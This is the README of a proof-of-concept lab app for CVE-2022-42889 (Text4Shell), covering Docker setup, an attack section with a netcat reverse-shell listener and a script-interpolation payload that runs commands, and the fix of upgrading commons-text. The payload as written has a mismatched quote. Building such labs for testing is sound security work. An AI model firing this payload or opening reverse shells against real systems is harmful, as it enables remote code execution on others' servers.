# CVE-2022-42889 PoC Test Application
This is a vulnerable application developed as a Proof of Concept for the vulnerability [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889). 

# Vulnerable app set-up
You can use Docker to be able to run this PoC:

1. Clone the git repo
```
   git clone https://github.com/securekomodo/text4shell-poc.git
   cd text4shell-poc
```

1. Docker build

```
   docker build --tag=text4shell-poc .
```

1. Docker run

```
   docker run -p 80:8080 text4shell-poc
```

1. Test the vulnerable app

```
   http://localhost/
```

# Attack Set-up

1. Reverse TCP listener
```
   sudo apt install rlwrap
```
```
   sudo rlwrap nc -nlvp 443
```
1. Payload
```
   ${script:javascript:java.lang.Runtime.getRuntime().exec'<Command to Execute>’)}
```

Recommended URL encoder for successful exploit demonstration: [https://www.urlencoder.org/](https://www.urlencoder.org/).

Reverse Shell generator [Generate Reverse Shell](https/www.revshells.com/)

Alternatively you can validate the effectiveness of scanning tools such as [text4shell-scan](https://github.com/securekomodo/text4shell-scan)



# The Fix
The fix for this is to update your instances of `commons-text` to versions `1.10.0` or later.


# Author
*Bryan Smith*
* Twitter: [https://twitter.com/securekomodo](https://twitter.com/securekomodo)
